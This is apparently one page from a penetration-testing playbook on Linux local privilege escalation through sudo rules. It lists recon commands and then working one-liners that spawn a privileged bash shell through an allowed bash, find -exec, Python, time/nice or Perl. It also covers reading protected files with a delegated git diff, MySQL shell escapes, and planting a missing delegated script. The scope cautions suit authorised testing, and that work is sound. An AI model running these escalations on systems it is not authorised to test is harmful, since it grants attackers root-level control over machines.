# LPRIV-03. Writable privileged scheduler

**Run this when:** `sudo -n -l` or `sudo -l` lists an allowed command, run-as identity, or fixed argument rule.

```bash
sudo -n -l
command -v '<ALLOWED_EXECUTABLE>'
namei -l -- '<ABSOLUTE_ALLOWED_EXECUTABLE>'
file -- '<ABSOLUTE_ALLOWED_EXECUTABLE>'
```

Keep the full rule, including tags, run-as user, executable path, arguments, and wildcards. Compare the exact executable and allowed arguments with GTFOBins. Do not widen a rule by substituting another path.

**Look for:** unrestricted delegation, an allowed shell, an executable that can start a child process, a missing delegated script, or an exact protected-file read.

## Use only a rule that matches

```bash
# Direct GNU Bash
sudo -n -u '<RUN_AS_USER>' -- '<ALLOWED_BASH>' --noprofile --norc

# GNU find, Python 3, GNU time, GNU nice, or Perl, only when the rule permits every shown argument
sudo -n -u '<RUN_AS_USER>' -- '<ALLOWED_FIND>' '<EXISTING_START_PATH>' -maxdepth 0 -exec /bin/bash --noprofile --norc -p \;
sudo -n -u '<RUN_AS_USER>' -- '<ALLOWED_PYTHON3>' -I -c 'import os; os.execl("/bin/bash","/bin/bash","--noprofile","--norc","-p")'
sudo -n -u '<RUN_AS_USER>' -- '<ALLOWED_TIME_OR_NICE>' /bin/bash --noprofile --norc -p
sudo -n -u '<RUN_AS_USER>' -- '<ALLOWED_PERL>' -e 'exec "/bin/bash","/bin/bash","--noprofile","--norc","-p"'
```

Run one matching form. A restricted script, editor, fixed argument, or different implementation needs its own reviewed behavior.

```bash
# In the opened shell
/usr/bin/id
/bin/hostname
/bin/cat /proc/self/uid_map
```

**If found:** a verified new identity goes to [LPRIV-15](./lpriv-15). A shell prompt alone is not proof.

## Exact non-shell cases

Delegated Git can read one known small protected text file with `git diff --no-index /dev/null '<FILE>'` only if the exact rule permits it. A delegated MySQL or MariaDB client may support a client shell escape only in known local SQL context. A missing delegated script may be created once only when the exact leaf is absent and its trusted parent is writable. A reviewed service wrapper may start the literal shell path it resolves, but must not receive `start`, `stop`, or guessed service arguments.

```bash
exit
id
sudo -k
```

Exit only the child shell. Remove a newly created delegated script only when its recorded inode, metadata, and hash still match; otherwise stop and preserve the unexpected file.

**If nothing matches exactly:** continue to [LPRIV-04](./lpriv-04). Keep the rule as evidence instead of guessing an escape.
